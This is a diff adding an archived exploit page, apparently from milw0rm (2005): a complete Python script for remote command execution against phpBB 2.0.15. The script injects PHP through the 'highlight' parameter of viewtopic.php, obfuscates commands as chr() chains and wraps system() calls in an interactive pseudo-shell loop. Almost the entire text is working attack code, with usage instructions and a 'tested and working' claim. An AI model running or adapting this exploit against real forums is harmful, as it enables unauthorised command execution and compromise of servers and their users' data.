@@ -1,0 +1,90 @@
+<html><head><title>phpBB 2.0.15 (highlight) Remote PHP Code Execution</title></head><pre># tested and working /str0ke
+
+#!/usr/bin/pyth0n
+#
+###############################################################  this exploit for
+                                                              #  phpBB 2.0.15 
+print &quot;\nphpBB 2.0.15 arbitrary command execution eXploit&quot;    #  emulates a shell,
+print &quot; 2005 by rattle@awarenetwork.org&quot;                      #  rather than 
+print &quot; well, just because there is none.&quot;                    #  sending a single
+                                                              #  command.
+import sys                                                 ####
+from urllib2 import Request, urlopen
+from urlparse import urlparse, urlunparse
+from urllib import quote as quote_plus
+
+INITTAG = '&lt;g0&gt;'
+ENDTAG  = '&lt;/g0&gt;'
+
+def makecmd(cmd):
+    return reduce(lambda x,y: x+'.chr(%d)'%ord(y),cmd[1:],'chr(%d)'%ord(cmd[0]))
+
+
+_ex  = &quot;%sviewtopic.php?t=%s&amp;highlight=%%27.&quot;
+_ex += &quot;printf(&quot; + makecmd(INITTAG) + &quot;).system(%s).&quot;
+_ex += &quot;printf(&quot; + makecmd(ENDTAG) + &quot;).%%27&quot;
+
+
+def usage():
+    print &quot;&quot;&quot;Usage: %s &lt;forum&gt; &lt;topic&gt;
+ 
+    forum - fully qualified url to the forum
+            example: http://www.host.com/phpBB/
+
+    topic - ID of an existing topic. Well you 
+            will have to check yourself.
+
+&quot;&quot;&quot;[:-1] % sys.argv[0]; sys.exit(1)
+
+
+if __name__ == '__main__':
+
+    if len(sys.argv) &lt; 3 or not sys.argv[2].isdigit():
+        usage()
+    else:
+        print
+        url = sys.argv[1]
+        if url.count(&quot;://&quot;) == 0: 
+            url = &quot;http://&quot; + url
+        url = list(urlparse(url))
+        host = url[1]
+        if not host: usage()
+
+        if not url[0]: url[0] = 'http'
+        if not url[2]: url[2] = '/'
+        url[3] = url[4] = url[5] = ''
+
+        url = urlunparse(url)
+	if url[-1] != '/': url += '/'
+
+        topic = quote_plus((sys.argv[2]))
+
+        while 1:
+
+            try:
+                cmd = raw_input(&quot;[%s]$ &quot; % host).strip()
+                if cmd[-1]==';': cmd=cmd[:-1]
+
+                if (cmd == &quot;exit&quot;): break
+                else: cmd = makecmd(cmd)
+		
+		out = _ex % (url,topic,cmd)
+
+                try: ret = urlopen(Request(out)).read()
+                except KeyboardInterrupt: continue
+                except: pass
+
+                else:
+                    ret = ret.split(INITTAG,1)
+                    if len(ret)&gt;1: ret = ret[1].split(ENDTAG,1)
+                    if len(ret)&gt;1:
+                        ret = ret[0].strip();
+                        if ret: print ret
+                        continue;
+
+                print &quot;EXPLOIT FAILED&quot;
+
+            except:
+                continue
+
+# milw0rm.com [2005-06-29]</pre></html>
